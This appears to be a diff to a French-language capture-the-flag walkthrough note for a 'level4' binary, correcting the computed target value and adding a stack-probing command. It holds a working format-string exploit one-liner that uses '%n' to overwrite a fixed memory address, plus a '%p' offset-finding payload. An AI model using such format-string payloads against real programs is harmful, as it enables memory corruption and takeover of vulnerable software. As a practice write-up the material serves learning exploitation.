@@ -6,7 +6,11 @@ meme principe que pour le level3 donc sauf que ce coup ci l'addresse a ecraser e
 on voit une comparaison avec un nombre en dur dans le code:
    0x08048492 <+59>:	cmp    $0x1025544,%eax
 
-qui vaut donc: 16930112c
+qui vaut donc: 16930116 - 4
+
+
+python -c "print 'AAAA' + '%p '*15" | ./level3
+pour avoir l'offset
 
 python -c "print('\x08\x04\x98\x10'[::-1] + '%16930112c'+ '%12\$n')" | ./level4
 
